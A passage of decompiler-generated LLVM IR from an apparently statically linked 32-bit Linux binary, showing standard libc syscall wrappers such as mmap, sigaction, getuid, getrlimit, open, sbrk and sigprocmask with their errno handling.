  %v2_804b9f5 = load i32, i32* %arg2, align 4
  store i32 %v2_804b9f5, i32* %stack_var_-148, align 4
  %v1_804b9fe = add i32 %tmp11, 4
  %v3_804ba10 = bitcast i32* %stack_var_-136 to i16*
  %v4_804ba10 = call i32 @memcpy(i16* %v3_804ba10, i32 %v1_804b9fe, i32 128)
  br label %dec_label_pc_804ba45

dec_label_pc_804ba45:                             ; preds = %entry, %dec_label_pc_804b9f5
  %v1_804ba47 = icmp eq i32 %arg3, 0
  br i1 %v1_804ba47, label %dec_label_pc_804ba4f, label %dec_label_pc_804ba4b

dec_label_pc_804ba4b:                             ; preds = %dec_label_pc_804ba45
  %v2_804ba4b = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_804ba4f

dec_label_pc_804ba4f:                             ; preds = %dec_label_pc_804ba45, %dec_label_pc_804ba4b
  %v0_804ba5e = phi i32 [ 0, %dec_label_pc_804ba45 ], [ %v2_804ba4b, %dec_label_pc_804ba4b ]
  br i1 %v1_804b9f1, label %dec_label_pc_804ba5c, label %dec_label_pc_804ba55

dec_label_pc_804ba55:                             ; preds = %dec_label_pc_804ba4f
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_804ba5c

dec_label_pc_804ba5c:                             ; preds = %dec_label_pc_804ba4f, %dec_label_pc_804ba55
  %v0_804ba5f = phi %sigaction* [ null, %dec_label_pc_804ba4f ], [ %phitmp, %dec_label_pc_804ba55 ]
  %v5_804ba67 = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_804ba5f, i32 %v0_804ba5e, i32 8)
  store i32 %v5_804ba67, i32* %ebx.global-to-local, align 4
  br i1 %v1_804ba47, label %dec_label_pc_804baaa, label %dec_label_pc_804ba75

dec_label_pc_804ba75:                             ; preds = %dec_label_pc_804ba5c
  %v2_804ba75 = icmp slt i32 %v5_804ba67, 0
  br i1 %v2_804ba75, label %dec_label_pc_804baaa, label %dec_label_pc_804ba79

dec_label_pc_804ba79:                             ; preds = %dec_label_pc_804ba75
  %v3_804ba79 = load i32, i32* %stack_var_-288, align 4
  %v2_804ba7d = inttoptr i32 %arg3 to i32*
  store i32 %v3_804ba79, i32* %v2_804ba7d, align 4
  %v2_804ba85 = ptrtoint i32* %stack_var_-276 to i32
  %v1_804ba8a = add i32 %arg3, 4
  %v3_804ba8e = inttoptr i32 %v1_804ba8a to i16*
  %v4_804ba8e = call i32 @memcpy(i16* %v3_804ba8e, i32 %v2_804ba85, i32 128)
  %v2_804ba97 = add i32 %arg3, 132
  %v3_804ba97 = inttoptr i32 %v2_804ba97 to i32*
  %v2_804baa4 = add i32 %arg3, 136
  %v3_804baa4 = inttoptr i32 %v2_804baa4 to i32*
  %v0_804bab0.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804baaa

dec_label_pc_804baaa:                             ; preds = %dec_label_pc_804ba75, %dec_label_pc_804ba5c, %dec_label_pc_804ba79
  %v0_804bab0 = phi i32 [ %v5_804ba67, %dec_label_pc_804ba75 ], [ %v5_804ba67, %dec_label_pc_804ba5c ], [ %v0_804bab0.pre, %dec_label_pc_804ba79 ]
  store i32 %v0_804b9dc, i32* @ebx, align 4
  store i32 %v0_804b9db, i32* @esi, align 4
  ret i32 %v0_804bab0

; uselistorder directives
  uselistorder i32 %v5_804ba67, { 0, 1, 3, 2 }
  uselistorder i1 %v1_804ba47, { 1, 0 }
  uselistorder i1 %v1_804b9f1, { 1, 0 }
  uselistorder i32* null, { 0, 3, 4, 5, 6, 1, 2, 7 }
  uselistorder i32 %arg3, { 2, 1, 4, 3, 0, 5 }
  uselistorder label %dec_label_pc_804baaa, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ba5c, { 1, 0 }
  uselistorder label %dec_label_pc_804ba4f, { 1, 0 }
  uselistorder label %dec_label_pc_804ba45, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_804bab8 = load i32, i32* @ebx, align 4
  %v2_804babf = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_804babf, i32* @ebx, align 4
  %v8_804bac3 = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_804bab8, i32* @ebx, align 4
  %tmp = icmp ugt i32 %v8_804bac3, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 134531572)
  ret i32 %v8_804bac3

; uselistorder directives
  uselistorder i32 %v8_804bac3, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 2, 1, 0 }
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804bad4 = load i32, i32* @ebx, align 4
  store i32 %v0_804bad4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804bae7 = call i32 @int80_syscall(i32 102)
  store i32 %v1_804bae7, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804bae7, -4095
  br i1 %tmp, label %dec_label_pc_804bb00, label %dec_label_pc_804baf4

dec_label_pc_804baf4:                             ; preds = %entry
  %v0_804baf4 = load i32, i32* %stack_var_-4, align 4
  %v1_804baf4 = call i32 @__errno_location(i32 %v0_804baf4)
  %v0_804baf9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804baf9 = sub i32 0, %v0_804baf9
  %v2_804bafb = inttoptr i32 %v1_804baf4 to i32*
  store i32 %v1_804baf9, i32* %v2_804bafb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804bb00

dec_label_pc_804bb00:                             ; preds = %entry, %dec_label_pc_804baf4
  %v0_804bb01 = phi i32 [ %v1_804bae7, %entry ], [ -1, %dec_label_pc_804baf4 ]
  %v2_804bb00 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804bb00, i32* @edx, align 4
  %v2_804bb04 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804bb04, i32* @ebx, align 4
  ret i32 %v0_804bb01

; uselistorder directives
  uselistorder i32 %v1_804bae7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bb00, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_804bb09 = load i32, i32* @esi, align 4
  store i32 %v0_804bb09, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804bb1d = load i32, i32* @ebx, align 4
  %v7_804bb25 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_804bb25, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v7_804bb25, -4095
  br i1 %tmp, label %dec_label_pc_804bb3d, label %dec_label_pc_804bb31

dec_label_pc_804bb31:                             ; preds = %entry
  %v1_804bb31 = call i32 @__errno_location(i32 %v0_804bb1d)
  %v0_804bb36 = load i32, i32* %esi.global-to-local, align 4
  %v1_804bb36 = sub i32 0, %v0_804bb36
  %v2_804bb38 = inttoptr i32 %v1_804bb31 to i32*
  store i32 %v1_804bb36, i32* %v2_804bb38, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804bb3d

dec_label_pc_804bb3d:                             ; preds = %entry, %dec_label_pc_804bb31
  %v0_804bb3e = phi i32 [ %v7_804bb25, %entry ], [ -1, %dec_label_pc_804bb31 ]
  %v2_804bb40 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804bb40, i32* @esi, align 4
  ret i32 %v0_804bb3e

; uselistorder directives
  uselistorder i32 %v7_804bb25, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bb3d, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804bb44 = load i32, i32* @ebx, align 4
  store i32 %v0_804bb44, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_804bb57 = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_804bb57, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804bb57, -4095
  br i1 %tmp, label %dec_label_pc_804bb70, label %dec_label_pc_804bb64

dec_label_pc_804bb64:                             ; preds = %entry
  %v0_804bb64 = load i32, i32* %stack_var_-4, align 4
  %v1_804bb64 = call i32 @__errno_location(i32 %v0_804bb64)
  %v0_804bb69 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bb69 = sub i32 0, %v0_804bb69
  %v2_804bb6b = inttoptr i32 %v1_804bb64 to i32*
  store i32 %v1_804bb69, i32* %v2_804bb6b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804bb70

dec_label_pc_804bb70:                             ; preds = %entry, %dec_label_pc_804bb64
  %v0_804bb71 = phi i32 [ %v4_804bb57, %entry ], [ -1, %dec_label_pc_804bb64 ]
  %v2_804bb70 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804bb70, i32* @edx, align 4
  %v2_804bb74 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804bb74, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804bb71

; uselistorder directives
  uselistorder i32 %v4_804bb57, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804bb70, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804bb7b = ptrtoint i32* %stack_var_-8 to i32
  %v2_804bb82 = call i32 @getrlimit(i32 7, i32 %v2_804bb7b)
  store i32 256, i32* @edx, align 4
  %v2_804bb8f = icmp slt i32 %v2_804bb82, 0
  br i1 %v2_804bb8f, label %dec_label_pc_804bb97, label %dec_label_pc_804bb93

dec_label_pc_804bb93:                             ; preds = %entry
  %v3_804bb93 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_804bb93, i32* @edx, align 4
  br label %dec_label_pc_804bb97

dec_label_pc_804bb97:                             ; preds = %entry, %dec_label_pc_804bb93
  %v0_804bb97 = phi i32 [ 256, %entry ], [ %v3_804bb93, %dec_label_pc_804bb93 ]
  ret i32 %v0_804bb97

; uselistorder directives
  uselistorder label %dec_label_pc_804bb97, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804bba0 = load i32, i32* @ebx, align 4
  store i32 %v0_804bba0, i32* %stack_var_-4, align 4
  %v1_804bba9 = call i32 @int80_syscall(i32 202)
  store i32 %v1_804bba9, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804bba9, -4095
  br i1 %tmp, label %dec_label_pc_804bbc0, label %dec_label_pc_804bbb4

dec_label_pc_804bbb4:                             ; preds = %entry
  %v0_804bbb4 = load i32, i32* %stack_var_-4, align 4
  %v1_804bbb4 = call i32 @__errno_location(i32 %v0_804bbb4)
  %v0_804bbb9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bbb9 = sub i32 0, %v0_804bbb9
  %v2_804bbbb = inttoptr i32 %v1_804bbb4 to i32*
  store i32 %v1_804bbb9, i32* %v2_804bbbb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804bbc0

dec_label_pc_804bbc0:                             ; preds = %entry, %dec_label_pc_804bbb4
  %v0_804bbc1 = phi i32 [ %v1_804bba9, %entry ], [ -1, %dec_label_pc_804bbb4 ]
  %v2_804bbc4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804bbc4, i32* @ebx, align 4
  ret i32 %v0_804bbc1

; uselistorder directives
  uselistorder i32 %v1_804bba9, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bbc0, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804bbc8 = load i32, i32* @ebx, align 4
  store i32 %v0_804bbc8, i32* %stack_var_-4, align 4
  %v1_804bbd1 = call i32 @int80_syscall(i32 201)
  store i32 %v1_804bbd1, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804bbd1, -4095
  br i1 %tmp, label %dec_label_pc_804bbe8, label %dec_label_pc_804bbdc

dec_label_pc_804bbdc:                             ; preds = %entry
  %v0_804bbdc = load i32, i32* %stack_var_-4, align 4
  %v1_804bbdc = call i32 @__errno_location(i32 %v0_804bbdc)
  %v0_804bbe1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bbe1 = sub i32 0, %v0_804bbe1
  %v2_804bbe3 = inttoptr i32 %v1_804bbdc to i32*
  store i32 %v1_804bbe1, i32* %v2_804bbe3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804bbe8

dec_label_pc_804bbe8:                             ; preds = %entry, %dec_label_pc_804bbdc
  %v0_804bbe9 = phi i32 [ %v1_804bbd1, %entry ], [ -1, %dec_label_pc_804bbdc ]
  %v2_804bbec = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804bbec, i32* @ebx, align 4
  ret i32 %v0_804bbe9

; uselistorder directives
  uselistorder i32 %v1_804bbd1, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bbe8, { 1, 0 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804bbf0 = load i32, i32* @ebx, align 4
  store i32 %v0_804bbf0, i32* %stack_var_-4, align 4
  %v1_804bbf9 = call i32 @int80_syscall(i32 200)
  store i32 %v1_804bbf9, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804bbf9, -4095
  br i1 %tmp, label %dec_label_pc_804bc10, label %dec_label_pc_804bc04

dec_label_pc_804bc04:                             ; preds = %entry
  %v0_804bc04 = load i32, i32* %stack_var_-4, align 4
  %v1_804bc04 = call i32 @__errno_location(i32 %v0_804bc04)
  %v0_804bc09 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bc09 = sub i32 0, %v0_804bc09
  %v2_804bc0b = inttoptr i32 %v1_804bc04 to i32*
  store i32 %v1_804bc09, i32* %v2_804bc0b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804bc10

dec_label_pc_804bc10:                             ; preds = %entry, %dec_label_pc_804bc04
  %v0_804bc11 = phi i32 [ %v1_804bbf9, %entry ], [ -1, %dec_label_pc_804bc04 ]
  %v2_804bc14 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804bc14, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804bc11

; uselistorder directives
  uselistorder i32 %v1_804bbf9, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bc10, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v0_804bc18 = load i32, i32* @global_var_8052510.75, align 16
  store i32 %v0_804bc18, i32* @edx, align 4
  %v1_804bc23 = icmp eq i32 %v0_804bc18, 0
  %v1_804bc25 = icmp eq i1 %v1_804bc23, false
  %v4_804bc25 = select i1 %v1_804bc25, i32 %v0_804bc18, i32 4096
  ret i32 %v4_804bc25
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804bc2c = load i32, i32* @ebx, align 4
  store i32 %v0_804bc2c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804bc3f = call i32 @int80_syscall(i32 191)
  store i32 %v1_804bc3f, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804bc3f, -4095
  br i1 %tmp, label %dec_label_pc_804bc58, label %dec_label_pc_804bc4c

dec_label_pc_804bc4c:                             ; preds = %entry
  %v0_804bc4c = load i32, i32* %stack_var_-4, align 4
  %v1_804bc4c = call i32 @__errno_location(i32 %v0_804bc4c)
  %v0_804bc51 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bc51 = sub i32 0, %v0_804bc51
  %v2_804bc53 = inttoptr i32 %v1_804bc4c to i32*
  store i32 %v1_804bc51, i32* %v2_804bc53, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804bc58

dec_label_pc_804bc58:                             ; preds = %entry, %dec_label_pc_804bc4c
  %v0_804bc59 = phi i32 [ %v1_804bc3f, %entry ], [ -1, %dec_label_pc_804bc4c ]
  %v2_804bc5c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804bc5c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804bc59

; uselistorder directives
  uselistorder i32 %v1_804bc3f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bc58, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804bc60 = load i32, i32* @ebx, align 4
  store i32 %v0_804bc60, i32* %stack_var_-4, align 4
  %v1_804bc69 = call i32 @int80_syscall(i32 199)
  store i32 %v1_804bc69, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804bc69, -4095
  br i1 %tmp, label %dec_label_pc_804bc80, label %dec_label_pc_804bc74

dec_label_pc_804bc74:                             ; preds = %entry
  %v0_804bc74 = load i32, i32* %stack_var_-4, align 4
  %v1_804bc74 = call i32 @__errno_location(i32 %v0_804bc74)
  %v0_804bc79 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bc79 = sub i32 0, %v0_804bc79
  %v2_804bc7b = inttoptr i32 %v1_804bc74 to i32*
  store i32 %v1_804bc79, i32* %v2_804bc7b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804bc80

dec_label_pc_804bc80:                             ; preds = %entry, %dec_label_pc_804bc74
  %v0_804bc81 = phi i32 [ %v1_804bc69, %entry ], [ -1, %dec_label_pc_804bc74 ]
  %v2_804bc84 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804bc84, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804bc81

; uselistorder directives
  uselistorder i32 %v1_804bc69, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bc80, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804bc88 = load i32, i32* @ebx, align 4
  store i32 %v0_804bc88, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_804bc9b = call i32 @munmap(i32 %v0_804bc88, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_804bc9b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804bc9b, -4095
  br i1 %tmp, label %dec_label_pc_804bcb4, label %dec_label_pc_804bca8

dec_label_pc_804bca8:                             ; preds = %entry
  %v0_804bca8 = load i32, i32* %stack_var_-4, align 4
  %v1_804bca8 = call i32 @__errno_location(i32 %v0_804bca8)
  %v0_804bcad = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bcad = sub i32 0, %v0_804bcad
  %v2_804bcaf = inttoptr i32 %v1_804bca8 to i32*
  store i32 %v1_804bcad, i32* %v2_804bcaf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804bcb4

dec_label_pc_804bcb4:                             ; preds = %entry, %dec_label_pc_804bca8
  %v0_804bcb5 = phi i32 [ %v4_804bc9b, %entry ], [ -1, %dec_label_pc_804bca8 ]
  %v2_804bcb4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804bcb4, i32* @edx, align 4
  %v2_804bcb8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804bcb8, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804bcb5

; uselistorder directives
  uselistorder i32 %v4_804bc9b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804bcb4, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804bcbf = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_804bcc3 = sdiv i32 %sext, 16777216
  store i32 %v4_804bcc3, i32* @ecx, align 4
  %v4_804bcc7 = ptrtoint i8* %arg1 to i32
  %v3_804bccb = and i32 %arg2, 64
  %v4_804bccb = icmp eq i32 %v3_804bccb, 0
  br i1 %v4_804bccb, label %dec_label_pc_804bcdc, label %dec_label_pc_804bcd0

dec_label_pc_804bcd0:                             ; preds = %entry
  %phitmp = urem i32 %arg3, 65536
  br label %dec_label_pc_804bcdc

dec_label_pc_804bcdc:                             ; preds = %entry, %dec_label_pc_804bcd0
  %v0_804bcdc = phi i32 [ 0, %entry ], [ %phitmp, %dec_label_pc_804bcd0 ]
  store i32 %v0_804bcdc, i32* @edx, align 4
  store i32 %v4_804bcc7, i32* %ebx.global-to-local, align 4
  %v5_804bce7 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_804bcc3)
  store i32 %v5_804bce7, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v5_804bce7, -4095
  br i1 %tmp, label %dec_label_pc_804bcff, label %dec_label_pc_804bcf3

dec_label_pc_804bcf3:                             ; preds = %dec_label_pc_804bcdc
  %v1_804bcf3 = call i32 @__errno_location(i32 %v0_804bcbf)
  %v0_804bcf8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bcf8 = sub i32 0, %v0_804bcf8
  %v2_804bcfa = inttoptr i32 %v1_804bcf3 to i32*
  store i32 %v1_804bcf8, i32* %v2_804bcfa, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804bcff

dec_label_pc_804bcff:                             ; preds = %dec_label_pc_804bcdc, %dec_label_pc_804bcf3
  %v0_804bd02 = phi i32 [ %v5_804bce7, %dec_label_pc_804bcdc ], [ -1, %dec_label_pc_804bcf3 ]
  store i32 %v0_804bcbf, i32* @ebx, align 4
  ret i32 %v0_804bd02

; uselistorder directives
  uselistorder i32 %v5_804bce7, { 1, 0, 2 }
  uselistorder i32 %v4_804bcc3, { 1, 0 }
  uselistorder i32 %v0_804bcbf, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804bcff, { 1, 0 }
  uselistorder label %dec_label_pc_804bcdc, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_804bd17 = inttoptr i32 %arg1 to i8*
  %v4_804bd17 = call i32 @__libc_open(i8* %v3_804bd17, i32 577, i32 %arg2)
  ret i32 %v4_804bd17
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804bd21 = load i32, i32* @ebx, align 4
  %v0_804bd25 = load i32, i32* @global_var_8052544.82, align 4
  %v1_804bd25 = icmp eq i32 %v0_804bd25, 0
  %v1_804bd30 = icmp eq i1 %v1_804bd25, false
  br i1 %v1_804bd30, label %dec_label_pc_804bd43, label %dec_label_pc_804bd32

dec_label_pc_804bd32:                             ; preds = %entry
  %v1_804bd37 = call i32 @__GI_brk(i32 0)
  %v2_804bd3f = icmp slt i32 %v1_804bd37, 0
  br i1 %v2_804bd3f, label %dec_label_pc_804bd65, label %dec_label_pc_804bd32.dec_label_pc_804bd43_crit_edge

dec_label_pc_804bd32.dec_label_pc_804bd43_crit_edge: ; preds = %dec_label_pc_804bd32
  %v0_804bd45.pre = load i32, i32* @global_var_8052544.82, align 4
  br label %dec_label_pc_804bd43

dec_label_pc_804bd43:                             ; preds = %dec_label_pc_804bd32.dec_label_pc_804bd43_crit_edge, %entry
  %v0_804bd53 = phi i32 [ %v0_804bd45.pre, %dec_label_pc_804bd32.dec_label_pc_804bd43_crit_edge ], [ %v0_804bd25, %entry ]
  %v1_804bd43 = icmp eq i32 %arg1, 0
  %v1_804bd4a = icmp eq i1 %v1_804bd43, false
  br i1 %v1_804bd4a, label %dec_label_pc_804bd50, label %dec_label_pc_804bd4c

dec_label_pc_804bd4c:                             ; preds = %dec_label_pc_804bd43
  br label %dec_label_pc_804bd68

dec_label_pc_804bd50:                             ; preds = %dec_label_pc_804bd43
  store i32 %v0_804bd53, i32* @ebx, align 4
  %v2_804bd55 = add i32 %v0_804bd53, %arg1
  %v1_804bd59 = call i32 @__GI_brk(i32 %v2_804bd55)
  %v2_804bd61 = icmp slt i32 %v1_804bd59, 0
  %v1_804bd63 = icmp eq i1 %v2_804bd61, false
  br i1 %v1_804bd63, label %dec_label_pc_804bd50.dec_label_pc_804bd68_crit_edge, label %dec_label_pc_804bd65

dec_label_pc_804bd50.dec_label_pc_804bd68_crit_edge: ; preds = %dec_label_pc_804bd50
  %v0_804bd69.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804bd68

dec_label_pc_804bd65:                             ; preds = %dec_label_pc_804bd50, %dec_label_pc_804bd32
  br label %dec_label_pc_804bd68

dec_label_pc_804bd68:                             ; preds = %dec_label_pc_804bd50.dec_label_pc_804bd68_crit_edge, %dec_label_pc_804bd4c, %dec_label_pc_804bd65
  %v0_804bd69 = phi i32 [ %v0_804bd69.pre, %dec_label_pc_804bd50.dec_label_pc_804bd68_crit_edge ], [ %v0_804bd53, %dec_label_pc_804bd4c ], [ -1, %dec_label_pc_804bd65 ]
  %v2_804bd68 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804bd68, i32* @edx, align 4
  store i32 %v0_804bd21, i32* @ebx, align 4
  ret i32 %v0_804bd69

; uselistorder directives
  uselistorder i32 %v0_804bd53, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_804bd68, { 2, 0, 1 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_804bd71 = load i32, i32* @esi, align 4
  %v4_804bd75 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_804bd75, i32* @ecx, align 4
  %v2_804bd81 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_804bd81, label %dec_label_pc_804bd9a, label %dec_label_pc_804bd85

dec_label_pc_804bd85:                             ; preds = %entry
  %tmp = icmp ult i32 %arg1, 3
  br i1 %tmp, label %dec_label_pc_804bd9a, label %dec_label_pc_804bd8a

dec_label_pc_804bd8a:                             ; preds = %dec_label_pc_804bd85
  %v1_804bd8a = call i32 @__errno_location(i32 %v0_804bd71)
  %v1_804bd8f = inttoptr i32 %v1_804bd8a to i32*
  store i32 22, i32* %v1_804bd8f, align 4
  br label %dec_label_pc_804bdc1

dec_label_pc_804bd9a:                             ; preds = %dec_label_pc_804bd85, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_804bd9f = load i32, i32* @ebx, align 4
  %v7_804bda7 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_804bd9f, i32* @ebx, align 4
  store i32 %v7_804bda7, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v7_804bda7, -4095
  br i1 %tmp11, label %dec_label_pc_804bdc1, label %dec_label_pc_804bdb3

dec_label_pc_804bdb3:                             ; preds = %dec_label_pc_804bd9a
  %v1_804bdb3 = call i32 @__errno_location(i32 %v0_804bd9f)
  %v0_804bdb8 = load i32, i32* %esi.global-to-local, align 4
  %v1_804bdb8 = sub i32 0, %v0_804bdb8
  %v2_804bdba = inttoptr i32 %v1_804bdb3 to i32*
  store i32 %v1_804bdb8, i32* %v2_804bdba, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
